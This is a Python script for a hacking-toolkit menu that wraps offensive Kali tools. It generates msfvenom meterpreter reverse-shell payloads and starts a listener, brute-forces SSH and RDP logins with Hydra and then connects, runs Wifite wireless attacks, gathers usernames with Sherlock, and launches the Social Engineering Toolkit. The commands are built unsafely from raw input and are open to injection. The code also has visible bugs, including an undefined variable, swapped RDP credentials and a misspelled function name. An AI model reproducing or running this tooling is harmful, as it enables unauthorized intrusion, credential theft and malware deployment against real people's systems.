import subprocess
import os
import time
import pyautogui
import sys

def slow_print(text, delay=0.1):
    for char in text + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def print_red(text):
    red_text = "\033[91m" + text + "\033[0m"
    print(red_text)

def print_green(text):
    green_text = "\033[92m" + text + "\033[0m"
    print(green_text)

def skull():
    print("\n" * 5)  
    print("                           .          . ")
    print("                          /            \\      ")
    print("                         |,  .-.  .-.  ,|      ")
    print("                         | )(_ /  \\_ )( |")
    print("                         |/     /\\     \\|    ")
    print("\033[91m        (@_      <__    ^^    __>        ")
    print("          _       \\_______\\__|IIIIII|__/_____________________ ")
    print("          (_)\\@8@8{}<________________________________________> ")
    print("                  )_/       \\ IIIIII /                    ")
    print("                (@           --------                      ")
    print("\033[96m                                               ")
    print("\033[91m                           Version: 1.0                              ")
    print("\n" * 3) 

def menu():
    print_green('              [01]   Nmap Aggressive Network Scan.')
    print_green('              [02]   Create MSFVenom Payload.')
    print_green('              [03]   SSH Brute Force Attack (Linux).')
    print_green('              [04]   Gather Info With Sherlock.')
    print_green('              [05]   Launch Wifite.')
    print_green('              [06]   Perform Nmap OS Detection on The Network.')
    print_green('              [07]   RDP Brute Force Attack (Windows Login Page)')
    print_green('              [08]   Launch Social Engineering ToolKit [SET]')

def intro():
    slow_print('Installing & Checking Requirements...')
    slow_print('Remember kids, hacking is illegal')
    time.sleep(1)

    cmd = subprocess.run(['sudo', 'apt', 'update', '-y'])
    if cmd.returncode != 0:
        print('Failed to update. Please check your internet connection and try again.')

    cmd = subprocess.run(['sudo', 'apt', 'upgrade', '-y'])
    if cmd.returncode != 0:
        print('Failed to upgrade. Please check your internet connection and try again.')


    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'nmap'])
    if cmd.returncode != 0:
        print_red("Failed to install Nmap. Please check your internet connection and try again.")
        exit()

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'metasploit-framework'])
    if cmd.returncode != 0:
        print_red("Failed to install Metasploit Framework. Please check your internet connection and try again.")
        exit()

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'hydra'])
    if cmd.returncode != 0:
        print_red('Failed To Install Hydra. Please check your internet connection and try again.')
        exit()

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'sherlock'])
    if cmd.returncode != 0:
        print_red('Failed to install Sherlock. Please check your internet connection and try again.')

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'wifite'])
    if cmd.returncode != 0:
        print_red('Failed to install Wifite. Please check your internet connection and try again.')

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'freerdp2-x11'])
    if cmd.returncode != 0:
        print_red('Failed To Install xfreerdp. Please check your internet connection and try again.')

    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'set'])
    if cmd.returncode != 0:
        print_red('Failed to install set. Please check your internet connection and try again.')

    os.system('clear')

    while True:
        skull()
        menu()
        print()
        print()
        shell = input('\033[91mroot@kali:\033[0m\033[94mbhtoolkit~#\033[0m ')

        if shell == '1':
            nmap_aggressive_network_scan()
        elif shell == '2':
            msfvenom_payload_create()
        elif shell == '3':
            ssh_bruteforce_attack()
        elif shell == '4':
            information_gathering()
        elif shell == '5':
            wifite()
        elif shell == '6':
            os_detection_nmap()
        elif shell == '7':
            rdp_loginpage()
        elif shell == '8':
            set()
        elif shell == 'clear':
            os.system('clear')
        else:
            print_red(f'[-] Unknown command --> {shell}. Try Again!')
            exit()

def set():
    pyautogui.hotkey('ctrl', 'shift', 't')
    time.sleep(1)
    pyautogui.write('sudo setoolkit')
    pyautogui.press('enter')

def rdp_loginpage():
    user_rdp = input('Enter Windows Username to Brute Force: ')
    localhost = input('Enter Localhost: ')
    wordlist_rdp = input('Enter Wordlist: ')
    cmd = os.system(f'hydra -V -l {user_rdp} -P {wordlist_rdp} {localhost} rdp')

    if cmd != 0:
        print_red('Error Occured during brute force.')
        exit()

    rdp_user_ask = input('Wanna Connect To Desktop Now? (yes/no): ')
    rdp_username = input('Enter username of target: ')

    rdp_password = input('Enter password of target: ')
    rdp_localhost = input('Enter localhost of target: ')

    if rdp_user_ask == 'yes':
        cmd = os.system(f'xfreerdp /v:{rdp_localhost} /u:{rdp_usernamep} /p:{rdp_username}')

        if cmd != 0:
            print_red('An error occured during connecting to the desktop\nError Code 404.')
            exit()

    elif rdp_user_ask == 'no':
        print_red('Exiting...')
        time.sleep(0.50)
        exit()


def os_detection_nmap():
    print_red('** OS DETECTION MAY TAKE SOME TIME **')
    ip_target = input('Enter Target IP:')
    cmd = os.system(f'nmap -O {ip_target}')

    if cmd != 0:
        print_red('An Error Occured!')
        exit()

def wifite():
    user_ask = input('Enter your interface: ')
    time.sleep(0.50)
    cmd = os.system(f'airmon-ng start {user_ask}')
    cmd = os.system('airmon-ng check kill')
    cmd = os.system('wifite')

    if cmd != 0:
        print_red('Error!')
        exit()


def information_gathering():
    ppl = input('Enter Username Or Name To Gather: ')
    cmd = os.system(f'sherlock {ppl}')


def ssh_bruteforce_attack():
    ssh = input('Enter Target: ')
    login = input('Enter Login: ')
    wordlist = input('Enter Wordlist: ')

    cmd = os.system(f'hydra -V -l {login} -P {wordlist} {ssh} ssh')
    if cmd != 0:
        print_red("Error occurred during Hydra execution. Exiting...")
        exit()

    ask = input('Start Connecting Target Now? (yes/no): ')

    if ask == 'yes':
        login_crd = input('Enter Login Of The Target: ')
        password_crd = input('Enter Password Of Target: ')
        ip_crd = input('Enter Hostname Of Target: ')

        cmd = os.system(f'ssh {login_crd}@{ip_crd}')
        if cmd != 0:
            print_greem("Error occurred while connecting to the target. Exiting...")
            exit()
    else:
        print('Exiting...')
        time.sleep(0.50)
        exit()

def msfvenom_payload_create():
    os.system('clear')
    print_green('[1] windows/meterpreter/reverse_tcp')
    print_green('[2] android/meterpreter/reverse_tcp')
    print_red('[3] Exit')
    print()
    choice = input('Enter Choice: ')
    ip = input('Enter Local Host: ')
    port = input('Enter Local Port: ')
    output = input('Enter Output Of The Payload (add .exe or .apk at the end): ')

    if choice == '1':
        payload_type = 'windows/meterpreter/reverse_tcp'
    elif choice == '2':
        payload_type = 'android/meterpreter/reverse_tcp'
    elif choice == '3':
        exit()
    else:
        print_red("Invalid choice.")
        return

    cmd = subprocess.run(['msfvenom', '-p', payload_type, f'LHOST={ip}', f'LPORT={port}', '-f', 'exe', '-o', output])
    if cmd.returncode == 0:
        print_red('** THE OUTPUT OF THE PAYLOAD IS ON THE FOLDER! **')
        msfconsole = input('Start Listener Now? (yes/no): ')
        if msfconsole == 'yes':
            subprocess.run(['msfconsole', '-q', '-x', f'use exploit/multi/handler;set payload {payload_type};set LHOST {ip};set LPORT {port};exploit'])
        else:
            print('Exiting...')
            time.sleep(0.10)
            exit()
    else:
        print_red("Failed to create the payload.")
        exit()

def nmap_aggressive_network_scan():
    user_ask_gateway_ip = input('Enter Gateway IP: ')
    cmd = subprocess.run(['nmap', '-T5', user_ask_gateway_ip])
    if cmd.returncode != 0:
        print_red("Failed to perform Nmap scan.")
        exit()

intro()
